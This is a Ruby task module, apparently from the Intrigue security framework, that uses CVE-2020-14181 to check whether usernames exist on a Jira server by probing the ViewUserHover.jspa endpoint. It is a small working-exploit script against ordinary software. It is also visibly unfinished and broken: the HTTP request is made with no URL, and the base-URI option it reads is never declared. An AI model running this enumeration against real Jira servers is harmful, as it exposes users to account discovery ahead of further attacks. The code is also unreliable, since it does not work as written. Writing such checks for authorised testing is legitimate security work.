module Intrigue
  module Task
  class JiraEnumerateUsersCve202014181 < BaseTask
  
    def self.metadata
      {
        :name => "jira_enumerate_users_cve_2020_14181",
        :pretty_name => "Jira Enumerate Users (CVE-2020-14181)",
        :authors => ["jcran", "ptswarm"],
        :description => "If the Jira server is running a vulnerable version, this'll 
          enumerate the users based on a provided username list",
        :references => [
          "https://twitter.com/ptswarm/status/1318914772918767619",
          "https://jira.atlassian.com/browse/JRASERVER-71560" 
        ],
        :type => "discovery",
        :passive => false,
        :allowed_types => ["EmailAddress"],
        :example_entities => [
          {"type" => "EmailAddress", "details" => {"name" => "doesnotexist@intrigue.io"}}],
        :allowed_options => [],
        :created_types => []
      }
    end
  
    def run
      super
  
      email = _get_entity_name
      username = email.split("@").first

      # TODO - check the corpus of URIs for jira server? 
      # For now, just rely on the user to set it 
      jira_base_uri = _get_option "jira_base_uri"

      ## https://jira.acme.com:443/secure/ViewUserHover.jspa?username=test
      check_link = "#{jira_base_uri}/secure/ViewUserHover.jspa?username=#{username}"
      body = http_get_body 
      
      ## CHECK THE BODY HERE 
      exists = true if body =~ /<img alt=\"#{username}\" class=\"avatar-image\"/i 
      
      # create users
      if exists 
        _create_normalized_webaccount("jira", jira_base_uri, check_link)
      end

    end # end run()
  
  end
  end
  end
  